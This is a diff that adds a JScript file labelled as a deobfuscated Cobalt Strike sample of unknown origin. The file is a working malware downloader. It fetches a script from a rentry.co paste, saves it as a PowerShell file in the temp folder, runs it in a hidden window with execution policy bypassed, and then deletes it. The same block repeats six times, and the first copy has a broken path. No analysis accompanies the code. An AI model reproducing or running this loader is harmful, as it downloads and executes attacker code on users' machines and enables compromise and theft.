@@ -1,0 +1,154 @@
+/*
+Cobalt Strike | Unknown Origin
+Deobfuscated By: Shaxowfall
+*/
+var t = WScript.CreateObject("WScript.Shell");
+var r = WScript.CreateObject("Scripting.FileSystemObject");
+var p = "https://rentry.co/popads5/raw";
+try {
+  var a;
+  var s;
+  var c;
+  var u;
+  var S = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  S.Open("GET", p, false);
+  S.Send();
+  if (200 === S.Status) {
+    a = S.ResponseText;
+    s = r.GetSpecialFolder(2) + "\tempScript.ps1";
+    (c = r.CreateTextFile(s, true)).WriteLine(a);
+    c.Close();
+    u = "powershell.exe -ExecutionPolicy Bypass -File \"" + s + "\"";
+    t.Run(u, 0, true);
+    r.DeleteFile(s);
+  } else {
+    WScript.Quit();
+  }
+} catch (t) {
+  WScript.Quit();
+}
+var t = WScript.CreateObject("WScript.Shell");
+var r = WScript.CreateObject("Scripting.FileSystemObject");
+var p = "https://rentry.co/popads5/raw";
+try {
+  var a;
+  var s;
+  var c;
+  var u;
+  var S = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  S.Open("GET", p, false);
+  S.Send();
+  if (200 === S.Status) {
+    a = S.ResponseText;
+    s = r.GetSpecialFolder(2) + "\\tempScript.ps1";
+    (c = r.CreateTextFile(s, true)).WriteLine(a);
+    c.Close();
+    u = "powershell.exe -ExecutionPolicy Bypass -File \"" + s + "\"";
+    t.Run(u, 0, true);
+    r.DeleteFile(s);
+  } else {
+    WScript.Quit();
+  }
+} catch (t) {
+  WScript.Quit();
+}
+var t = WScript.CreateObject("WScript.Shell");
+var r = WScript.CreateObject("Scripting.FileSystemObject");
+var p = "https://rentry.co/popads5/raw";
+try {
+  var a;
+  var s;
+  var c;
+  var u;
+  var S = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  S.Open("GET", p, false);
+  S.Send();
+  if (200 === S.Status) {
+    a = S.ResponseText;
+    s = r.GetSpecialFolder(2) + "\\tempScript.ps1";
+    (c = r.CreateTextFile(s, true)).WriteLine(a);
+    c.Close();
+    u = "powershell.exe -ExecutionPolicy Bypass -File \"" + s + "\"";
+    t.Run(u, 0, true);
+    r.DeleteFile(s);
+  } else {
+    WScript.Quit();
+  }
+} catch (t) {
+  WScript.Quit();
+}
+var t = WScript.CreateObject("WScript.Shell");
+var r = WScript.CreateObject("Scripting.FileSystemObject");
+var p = "https://rentry.co/popads5/raw";
+try {
+  var a;
+  var s;
+  var c;
+  var u;
+  var S = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  S.Open("GET", p, false);
+  S.Send();
+  if (200 === S.Status) {
+    a = S.ResponseText;
+    s = r.GetSpecialFolder(2) + "\\tempScript.ps1";
+    (c = r.CreateTextFile(s, true)).WriteLine(a);
+    c.Close();
+    u = "powershell.exe -ExecutionPolicy Bypass -File \"" + s + "\"";
+    t.Run(u, 0, true);
+    r.DeleteFile(s);
+  } else {
+    WScript.Quit();
+  }
+} catch (t) {
+  WScript.Quit();
+}
+var t = WScript.CreateObject("WScript.Shell");
+var r = WScript.CreateObject("Scripting.FileSystemObject");
+var p = "https://rentry.co/popads5/raw";
+try {
+  var a;
+  var s;
+  var c;
+  var u;
+  var S = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  S.Open("GET", p, false);
+  S.Send();
+  if (200 === S.Status) {
+    a = S.ResponseText;
+    s = r.GetSpecialFolder(2) + "\\tempScript.ps1";
+    (c = r.CreateTextFile(s, true)).WriteLine(a);
+    c.Close();
+    u = "powershell.exe -ExecutionPolicy Bypass -File \"" + s + "\"";
+    t.Run(u, 0, true);
+    r.DeleteFile(s);
+  } else {
+    WScript.Quit();
+  }
+} catch (t) {
+  WScript.Quit();
+}
+var t = WScript.CreateObject("WScript.Shell");
+var r = WScript.CreateObject("Scripting.FileSystemObject");
+var p = "https://rentry.co/popads5/raw";
+try {
+  var a;
+  var s;
+  var c;
+  var u;
+  var S = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+  S.Open("GET", p, false);
+  S.Send();
+  if (200 === S.Status) {
+    a = S.ResponseText;
+    s = r.GetSpecialFolder(2) + "\\tempScript.ps1";
+    (c = r.CreateTextFile(s, true)).WriteLine(a);
+    c.Close();
+    u = "powershell.exe -ExecutionPolicy Bypass -File \"" + s + "\"";
+    t.Run(u, 0, true);
+    r.DeleteFile(s);
+  } else {
+    WScript.Quit();
+  }
+} catch (t) {
+  WScript.Quit();
+}
